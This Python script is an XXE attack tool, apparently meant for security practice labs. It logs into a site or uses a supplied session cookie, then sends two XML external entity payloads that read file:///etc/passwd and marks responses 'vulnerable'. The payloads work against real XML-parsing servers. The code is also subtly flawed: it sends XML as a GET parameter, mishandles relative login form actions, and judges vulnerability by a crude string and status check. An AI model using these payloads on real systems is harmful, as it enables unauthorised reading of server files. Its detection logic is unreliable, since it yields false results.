import requests
from bs4 import BeautifulSoup  # Added for HTML parsing
from termcolor import colored  # Added for colored output

# Assuming XXE_PAYLOADS is defined in an external module
XXE_PAYLOADS = [
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ 
            <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
        ]>
        <stockCheck><productId>&xxe;</productId></stockCheck>'''
    # Add more payloads as needed
]

def get_user_choice():
    while True:
        choice = input("Select the method for XXE testing:\n1. Login using username and password\n2. Use session cookies\nEnter 1 or 2: ")
        if choice in ['1', '2']:
            return choice
        else:
            print("Invalid choice! Please enter 1 or 2.")

def get_login_details():
    login_url = input("Enter the login URL: ")
    lab_url = input("Enter the lab URL: ")
    username = input("Enter your username: ")
    password = input("Enter your password: ")
    return login_url, lab_url, username, password

def get_cookie_details():
    lab_url = input("Enter the lab URL: ")
    session_cookie = input("Enter your session cookie: ")
    return lab_url, session_cookie

def login(session, url, username, password):
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        login_form = soup.find('form')

        if not login_form:
            raise ValueError("Login form not found")

        login_action = login_form['action']
        login_data = {input_tag['name']: input_tag.get('value', '') for input_tag in login_form.find_all('input') if 'name' in input_tag.attrs}
        login_data['email'] = username  # Adjust field names as necessary
        login_data['password'] = password

        login_url = url if login_action.startswith('/') else login_action
        response = session.post(login_url, data=login_data)
        response.raise_for_status()
        
        return response
    except Exception as e:
        print(f"Login failed: {e}")
        return None

def test_xxe_with_session(session, url, payloads):
    headers = {'Content-Type': 'application/xml'}
    results = []

    for payload in payloads:
        try:
            response = session.get(url, params={'xml': payload}, headers=headers)
            result = {
                'payload': payload,
                'status_code': response.status_code,
                'response_content': response.text[:500],  # Truncate for brevity
                'vulnerable': "xxe" in response.text.lower() or response.status_code == 500
            }
            results.append(result)
        except requests.RequestException as e:
            print(f"Request failed for payload: {payload}\nError: {e}")

    return results

def test_xxe_with_cookies(url, session_cookie):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': '/',
        'Connection': 'keep-alive',
        'Cookie': session_cookie,
        'Content-Type': 'application/xml'
    }

    for payload in XXE_PAYLOADS:
        try:
            response = requests.get(url, params={'xml': payload}, headers=headers)
            print(f"Payload sent:\n{payload}")
            print(f"Response Status Code: {response.status_code}")
            print(f"Response Content: {response.text[:500]}")  # Truncate for brevity
            print(colored(f"Vulnerable: {'xxe' in response.text.lower() or response.status_code == 500}\n", 'red' if 'xxe' in response.text.lower() or response.status_code == 500 else 'green'))
        except requests.RequestException as e:
            print(f"Request failed: {e}")

def main():
    choice = get_user_choice()

    if choice == '1':
        login_url, lab_url, username, password = get_login_details()
        with requests.Session() as session:
            login_response = login(session, login_url, username, password)
            if login_response and login_response.status_code == 200:
                print("Login successful!")
                print("Cookies after login:", session.cookies)
                print("Headers after login:", session.headers)
                xxe_results = test_xxe_with_session(session, lab_url, XXE_PAYLOADS)
                for result in xxe_results:
                    print(f"Payload sent:\n{result['payload']}")
                    print(f"Response Status Code: {result['status_code']}")
                    print(f"Response Content: {result['response_content']}")
                    print(colored(f"Vulnerable: {result['vulnerable']}\n", 'red' if result['vulnerable'] else 'green'))
            else:
                print("Login failed or was not successful.")
    elif choice == '2':
        lab_url, session_cookie = get_cookie_details()
        test_xxe_with_cookies(lab_url, session_cookie)

if __name__ == '__main__':
    main()